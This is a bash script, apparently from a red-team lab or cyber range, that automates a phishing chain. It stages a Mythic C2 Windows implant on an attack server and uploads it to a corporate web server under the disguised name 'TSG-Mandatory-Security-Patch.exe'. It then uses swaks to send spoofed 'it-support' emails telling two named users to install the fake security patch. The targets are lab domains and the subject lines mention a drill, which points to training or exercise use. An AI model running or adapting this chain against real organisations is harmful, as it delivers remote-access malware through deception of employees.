#!/bin/bash
#
# Mythic C2 + corporate web upload + SMTP phish to ben/kate.
#
# Prerequisites on the Linux ATTACK server:
#   1) Mythic listener running where your agent callbacks (often Docker on this host; see
#      attack_server_install_all_c2_tools.sh and https://docs.mythic-c2.net/ ).
#   2) A Windows agent built in Mythic (e.g. Apollo) placed at C2_STAGED_IMPLANT_PATH on the attack
#      host (default: /home/ubuntu/TSG-DesktopSupportAssistant.exe — bland name for drills).
#
# Optional: pass a LOCAL path to copy up first:
#   ./scripts/attack_scenario_mythic_email_phish.sh apac /path/to/mythic_agent.exe
#
set -euo pipefail

REGION="${1:?Usage: $0 <region> [local-mythic-payload.exe]}"
LOCAL_PAYLOAD="${2:-}"
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
REPO_ROOT="$(cd "${SCRIPT_DIR}/.." && pwd)"
cd "${REPO_ROOT}"

# shellcheck source=/dev/null
source "${SCRIPT_DIR}/attack_c2_helpers/runner_lib.sh"

export C2_FRAMEWORK=mythic
c2_validate_framework

SSH_KEY="terraform/certs/project-responder-ssh"
ATTACK_USER="ubuntu"
DISGUISED="${DISGUISED:-TSG-Mandatory-Security-Patch.exe}"

DETAILS_FILE="inventory/attack_server_details_${REGION}"
if [[ ! -f "${DETAILS_FILE}" ]]; then
  echo "[!] Missing ${DETAILS_FILE}"
  exit 1
fi

ATTACK_IP=$(awk '/^Linux Bastion Public IP:/ { print $5 }' "${DETAILS_FILE}")
FIREWALL_EIP=$(awk '/^Firewall EIP:/ { print $3 }' "${DETAILS_FILE}")
SSH_OPTS="-i ${SSH_KEY} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null"

if [[ -n "${LOCAL_PAYLOAD}" ]]; then
  if [[ ! -f "${LOCAL_PAYLOAD}" ]]; then
    echo "[!] Local payload not found: ${LOCAL_PAYLOAD}"
    exit 1
  fi
  echo "[*] Copying Mythic agent to attack server (${C2_STAGED_IMPLANT_PATH})..."
  scp ${SSH_OPTS} "${LOCAL_PAYLOAD}" "${ATTACK_USER}@${ATTACK_IP}:${C2_STAGED_IMPLANT_PATH}"
fi

echo "[*] Verifying staged implant on attack server (${C2_STAGED_IMPLANT_PATH})..."
if ! ssh ${SSH_OPTS} "${ATTACK_USER}@${ATTACK_IP}" "test -s '${C2_STAGED_IMPLANT_PATH}'"; then
  echo "[!] Missing or empty ${C2_STAGED_IMPLANT_PATH} on ${ATTACK_IP}"
  echo "    Build an agent in Mythic, download the Windows exe, then either:"
  echo "      scp -i ${SSH_KEY} ./YourAgent.exe ${ATTACK_USER}@${ATTACK_IP}:${C2_STAGED_IMPLANT_PATH}"
  echo "    or re-run:"
  echo "      $0 ${REGION} /path/to/YourAgent.exe"
  exit 1
fi

echo "[*] Mythic payload OK — building web delivery + listener notes..."
"${SCRIPT_DIR}/attack_serve_c2_payload_for_web_phishing.sh" "${REGION}"

echo "[*] Uploading to corporate web /uploads/ ..."
"${SCRIPT_DIR}/attack_upload_c2_payload_to_corporate_web.sh" "${REGION}" "${DISGUISED}"

PAYLOAD_URL_INT="http://web.tsg-internal.lab/uploads/${DISGUISED}"

echo "[*] Sending phishing email to ben + kate (SMTP ${FIREWALL_EIP}:25)..."
BODY="All employees must install the latest security patch from the corporate portal: ${PAYLOAD_URL_INT}"
ssh ${SSH_OPTS} "${ATTACK_USER}@${ATTACK_IP}" \
  "swaks --to ben@tsg-internal.lab --from it-support@tsg-internal.lab --server ${FIREWALL_EIP} --header 'Subject: ACTION REQUIRED: Mythic patch drill' --body '${BODY}'"
ssh ${SSH_OPTS} "${ATTACK_USER}@${ATTACK_IP}" \
  "swaks --to kate@tsg-internal.lab --from it-support@tsg-internal.lab --server ${FIREWALL_EIP} --header 'Subject: ACTION REQUIRED: Mythic patch drill' --body '${BODY}'"

echo ""
echo "[+] Mythic email phish chain complete."
echo "    Ensure your Mythic listener matches the agent you uploaded."
echo "    Operator notes: ssh ${SSH_OPTS} ${ATTACK_USER}@${ATTACK_IP} 'cat /home/ubuntu/listener.rc'"
